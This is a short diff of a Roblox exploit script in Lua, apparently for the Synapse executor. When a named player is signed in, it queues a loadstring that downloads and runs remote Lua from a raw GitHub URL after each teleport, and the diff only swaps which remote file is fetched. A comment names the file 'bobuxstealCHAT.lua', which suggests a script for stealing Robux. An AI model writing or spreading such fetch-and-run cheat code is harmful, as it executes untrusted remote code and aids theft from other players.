@@ -1,7 +1,9 @@
-game.Loaded:Wait()
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
 if game:GetService("Players").LocalPlayer.Name == "CirnoSaysNumbers" then
 
-syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixxerTrix/kkkkkkkkkkkkk/main/HHHHHHHHHH4.lua'))()")
+syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixxerTrix/kkkkkkkkkkkkk/main/HHHHHHHHHH2.lua'))()")
 
 --// bobuxstealCHAT.lua
 -- services
